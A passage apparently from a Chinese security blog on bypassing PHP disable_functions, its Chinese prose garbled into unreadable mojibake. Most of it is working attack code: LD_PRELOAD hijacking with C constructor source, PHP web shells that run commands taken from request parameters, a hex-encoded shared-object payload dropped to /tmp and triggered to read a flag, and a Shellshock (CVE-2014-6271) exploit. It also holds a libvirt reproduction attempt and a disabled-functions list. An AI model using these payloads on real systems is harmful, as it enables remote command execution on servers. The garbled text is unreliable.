class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ç”Ÿæˆ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o hack &amp;&amp; gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååˆ©ç”¨<code>putenv</code>å°†å˜é‡æ·»åŠ åˆ°æœåŠ¡å™¨</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=./hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆåŠŸæ‰§è¡Œpayload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@7fda2fc3e457:~<span class="comment"># cat /tmp/fe1w0</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h4 id="0x0b-åŠ«æŒå…±äº«å¯¹è±¡"><a href="#0x0b-åŠ«æŒå…±äº«å¯¹è±¡" class="headerlink" title="0x0b  åŠ«æŒå…±äº«å¯¹è±¡"></a>0x0b  <strong>åŠ«æŒå…±äº«å¯¹è±¡</strong></h4><p>æ­¤å¤–,å¯ä»¥çœ‹ä¸€ä¸‹<strong>yangyangwithgnuå¸ˆå‚…çš„åŸºäºåŠ«æŒå¯åŠ¨è¿›ç¨‹çš„bypass_disablefunc_via_LD_PRELOAD</strong></p>
<blockquote>
<p>æ ¸å¿ƒçŸ¥è¯†ç‚¹:</p>
<p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <strong>attribute</strong>((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <strong>attribute</strong>((constructor)) ä¿®é¥°çš„å‡½æ•°  from <a target="_blank" rel="noopener" href="https://www.freebuf.com/web/192052.html">https://www.freebuf.com/web/192052.html</a></p>
</blockquote>
<ul>
<li>bypass_disablefunc.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">&quot; &gt; &quot;</span> . $out_path . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>bypass_disablefunc_x64.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä»£ç è§£æ</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/227684.html">https://www.freebuf.com/vuls/227684.html</a> <strong>æ¨è</strong></p>
</blockquote>
<p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;/tmp/1.so&#x27;</span>,pack(<span class="string">&#x27;H*&#x27;</span>,<span class="string">&#x27;7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000028140000000000000000000040003800060040001c001900010000000500000000000000000000000000000000000000000000000000000004090000000000000409000000000000000020000000000001000000060000000809000000000000080920000000000008092000000000005802000000000000600200000000000000002000000000000200000006000000280900000000000028092000000000002809200000000000c001000000000000c0010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050e57464040000008408000000000000840800000000000084080000000000001c000000000000001c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000040000001400000003000000474e550066bb9e247f3731670b5cdfd534ac53233e576aef00000000030000000d000000010000000600000088c22001001440090d0000000f000000110000004245d5ecbbe3927cd871581cb98df10eead3ef0e6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900380600000000000000000000000000007d00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008b00000012000000000000000000000000000000000000009d00000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009e00000011000000000000000000000000000000000000006100000020000000000000000000000000000000000000009c0000001100000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000840000001200000000000000000000000000000000000000a600000010001600600b2000000000000000000000000000b900000010001700680b2000000000000000000000000000ad00000010001700600b20000000000000000000000000001000000012000900380600000000000000000000000000001600000012000c00600800000000000000000000000000007500000012000b00c0070000000000009d00000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200000002000200000002000000020000000200020001000100010001000100010001000100920000001000000000000000751a690900000200be00000000000000080920000000000008000000000000009007000000000000180920000000000008000000000000005007000000000000580b2000000000000800000000000000580b200000000000100920000000000001000000120000000000000000000000e80a20000000000006000000030000000000000000000000f00a20000000000006000000060000000000000000000000f80a20000000000006000000070000000000000000000000000b20000000000006000000080000000000000000000000080b200000000000060000000a0000000000000000000000100b200000000000060000000b0000000000000000000000300b20000000000007000000020000000000000000000000380b20000000000007000000040000000000000000000000400b20000000000007000000060000000000000000000000480b200000000000070000000b0000000000000000000000500b200000000000070000000c00000000000000000000004883ec08488b05ad0420004885c07405e8430000004883c408c30000000000000000000000000000ff35ba042000ff25bc0420000f1f4000ff25ba0420006800000000e9e0ffffffff25b20420006801000000e9d0ffffffff25aa0420006802000000e9c0ffffffff25a20420006803000000e9b0ffffffff259a0420006804000000e9a0ffffff488d3d99042000488d0599042000554829f84889e54883f80e7615488b05060420004885c074095dffe0660f1f4400005dc366666666662e0f1f840000000000488d3d59042000488d3552042000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05d90320004885c0740c5dffe0660f1f8400000000005dc366666666662e0f1f840000000000803d0904200000752748833daf03200000554889e5740c488b3dea032000e82dffffffe848ffffff5dc605e003200001f3c366666666662e0f1f840000000000488d3d8901200048833f00750be95effffff660f1f440000488b05510320004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e89cfeffff488945f0c745fc00000000eb4f488b0510032000488b008b55fc4863d248c1e2034801d0488b00488d35740000004889c7e8a6feffff4885c0741d488b05e2022000488b008b55fc4863d248c1e2034801d0488b00c600008345fc01488b05c1022000488b008b55fc4863d248c1e2034801d0488b004885c07592488b45f04889c7e825feffffc9c30000004883ec084883c408c34556494c5f434d444c494e45004c445f5052454c4f414400000000011b033b1800000002000000dcfdffff340000003cffffff5c0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0fdffff60000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000d8feffff9d00000000410e108602430d0602980c0708000000000000000000009007000000000000000000000000000050070000000000000000000000000000010000000000000092000000000000000c0000000000000038060000000000000d000000000000006008000000000000190000000000000008092000000000001b0000000000000010000000000000001a0000000000000018092000000000001c000000000000000800000000000000f5feff6f00000000b8010000000000000500000000000000c0030000000000000600000000000000f8010000000000000a00000000000000ca000000000000000b0000000000000018000000000000000300000000000000180b20000000000002000000000000007800000000000000140000000000000007000000000000001700000000000000c0050000000000000700000000000000d0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000b004000000000000ffffff6f000000000100000000000000f0ffff6f000000008a04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280920000000000000000000000000000000000000000000760600000000000086060000000000009606000000000000a606000000000000b606000000000000580b2000000000004743433a202844656269616e20342e392e322d31302b6465623875322920342e392e3200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200b80100000000000000000000000000000000000003000300f80100000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005008a0400000000000000000000000000000000000003000600b00400000000000000000000000000000000000003000700d00400000000000000000000000000000000000003000800c00500000000000000000000000000000000000003000900380600000000000000000000000000000000000003000a00600600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00600800000000000000000000000000000000000003000d00690800000000000000000000000000000000000003000e00840800000000000000000000000000000000000003000f00a00800000000000000000000000000000000000003001000080920000000000000000000000000000000000003001100180920000000000000000000000000000000000003001200200920000000000000000000000000000000000003001300280920000000000000000000000000000000000003001400e80a20000000000000000000000000000000000003001500180b20000000000000000000000000000000000003001600580b20000000000000000000000000000000000003001700600b2000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200200920000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00000700000000000000000000000000004100000002000b00500700000000000000000000000000005700000001001700600b20000000000001000000000000006600000001001100180920000000000000000000000000008d00000002000b0090070000000000000000000000000000990000000100100008092000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000cd00000001000f0000090000000000000000000000000000db0000000100120020092000000000000000000000000000000000000400f1ff00000000000000000000000000000000e700000001001600580b2000000000000000000000000000f40000000100130028092000000000000000000000000000fd00000001001600600b20000000000000000000000000000901000001001500180b20000000000000000000000000001f01000012000000000000000000000000000000000000003301000020000000000000000000000000000000000000004f01000010001600600b20000000000000000000000000005601000012000c00600800000000000000000000000000005c01000012000000000000000000000000000000000000007001000020000000000000000000000000000000000000007f01000011000000000000000000000000000000000000009401000010001700680b20000000000000000000000000009901000010001700600b2000000000000000000000000000a501000012000b00c0070000000000009d00000000000000ad0100002000000000000000000000000000000000000000c10100001100000000000000000000000000000000000000d80100002000000000000000000000000000000000000000f201000022000000000000000000000000000000000000000e02000012000900380600000000000000000000000000001402000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36363730005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006279706173735f64697361626c6566756e632e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f00656e7669726f6e4040474c4942435f322e322e35005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e6974007374727374724040474c4942435f322e322e3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000b801000000000000b8010000000000003c00000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000f801000000000000f801000000000000c80100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000008a040000000000008a04000000000000260000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b004000000000000b004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d004000000000000d004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000c005000000000000c0050000000000007800000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000380600000000000038060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000006006000000000000600600000000000060000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c0060000000000009d01000000000000000000000000000010000000000000000000000000000000840000000100000006000000000000006008000000000000600800000000000009000000000000000000000000000000040000000000000000000000000000008a00000001000000020000000000000069080000000000006908000000000000180000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000840800000000000084080000000000001c00000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000a008000000000000a0080000000000006400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000080920000000000008090000000000001000000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000180920000000000018090000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000200920000000000020090000000000000800000000000000000000000000000008000000000000000000000000000000c700000006000000030000000000000028092000000000002809000000000000c001000000000000040000000000000008000000000000001000000000000000d0000000010000000300000000000000e80a200000000000e80a0000000000003000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000180b200000000000180b0000000000004000000000000000000000000000000008000000000000000800000000000000de000000010000000300000000000000580b200000000000580b0000000000000800000000000000000000000000000008000000000000000000000000000000e4000000080000000300000000000000600b200000000000600b0000000000000800000000000000000000000000000001000000000000000000000000000000e90000000100000030000000000000000000000000000000600b0000000000002400000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000840b000000000000f200000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000780c00000000000088050000000000001b0000002b0000000800000000000000180000000000000009000000030000000000000000000000000000000000000000120000000000002802000000000000000000000000000001000000000000000000000000000000&#x27;</span>));putenv(<span class="string">&quot;EVIL_CMDLINE=/readflag &gt; /tmp/flag.txt&quot;</span>);putenv(<span class="string">&quot;LD_PRELOAD=/tmp/1.so&quot;</span>);error_log(<span class="string">&quot;&quot;</span>,<span class="number">1</span>);readfile(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="0x0c-å…¶ä»–"><a href="#0x0c-å…¶ä»–" class="headerlink" title="0x0c å…¶ä»–:"></a>0x0c å…¶ä»–:</h4><ul>
<li>libvirt_connect å¤ç°å¤±è´¥</li>
</ul>
<p>è¿™ä¸€ç‚¹å¯ä»¥çœ‹bi0så›¢é˜Ÿçš„åšå®¢,ä½†å¯æƒœçš„æ˜¯,æ²¡æœ‰å…·ä½“é˜è¿°å¦‚ä½•ä½¿ç”¨</p>
<p>é“¾æ¥å¦‚ä¸‹: </p>
<p><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/fuzzphunc">https://github.com/tarunkant/fuzzphunc</a></p>
<p>å¤ç°è¿‡ç¨‹å¦‚ä¸‹:[å¤±è´¥]</p>
<p>é…ç½®ç¯å¢ƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y php-libvirt-php <span class="comment">#å®‰è£… php-libvirt-php</span></span><br><span class="line"><span class="comment"># edit the current version php.ini</span></span><br><span class="line"><span class="comment"># On the last line, add the following statement</span></span><br><span class="line">[libvirt]</span><br><span class="line">extension=libvirt-php</span><br><span class="line">; Path to ISO images <span class="keyword">for</span> VM installations</span><br><span class="line">libvirt.iso_path=/var/lib/libvirt/images</span><br><span class="line">; Path <span class="built_in">where</span> disk images <span class="keyword">for</span> new VMs should be created</span><br><span class="line">libvirt.image_path=/var/lib/libvirt/images</span><br><span class="line">; Limit maximum number of libvirt connections</span><br><span class="line">libvirt.max_connections=5</span><br></pre></td></tr></table></figure>

<p>æ£€éªŒ:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r(libvirt_version());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥<code>phpinfo()</code></p>
<p>demo-script</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $logfile = <span class="string">&#x27;test.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    unlink($logfile);</span><br><span class="line">    <span class="keyword">if</span> (!libvirt_logfile_set($logfile))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;Cannot set the log file&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    $conn = libvirt_connect(<span class="string">&#x27;null&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">unset</span>($conn);</span><br><span class="line"></span><br><span class="line">    $fp = fopen($logfile, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    $str = fread($fp, filesize($logfile));</span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ˜¯å› ä¸ºä»£ç è¿è¡Œå¤±è´¥å¯¼è‡´åªæœ‰ä¸€ä¸ªexecvr???</p>
<p>Error_report</p>
<p>Failed to connect socket to â€˜/var/run/libvirt/libvirt-sockâ€™: No such file or directory</p>
<p>éœ€è¦ å®‰è£…kvm</p>
</blockquote>
<h3 id="0x02-ShellShock"><a href="#0x02-ShellShock" class="headerlink" title="0x02 ShellShock"></a>0x02 ShellShock</h3><blockquote>
<p>æ¨èç”¨Metasploitable2 </p>
</blockquote>
<p>åˆ©ç”¨bashç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰ï¼Œè¯¥æ¼æ´å­˜åœ¨äºbash 1.14 â€“ 4.3ç‰ˆæœ¬ä¸­<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qmfsun/p/7591757.html">https://www.cnblogs.com/qmfsun/p/7591757.html</a></p>
<p>å¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤<br>åˆ©ç”¨çš„PHPä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params">$cmd</span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   error_log(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-Apache-Mod-CGI"><a href="#0x03-Apache-Mod-CGI" class="headerlink" title="0x03 Apache Mod CGI"></a>0x03 Apache Mod CGI</h3><p>Apache Mod CGI <a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/apache/2.4/reference/howto-cgi.html">https://www.docs4dev.com/docs/zh/apache/2.4/reference/howto-cgi.html</a></p>
<p> ç¦ç”¨å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</span><br></pre></td></tr></table></figure>

<p>æ¯”ä¹‹å‰å¤šç¦ç”¨äº†putenv</p>
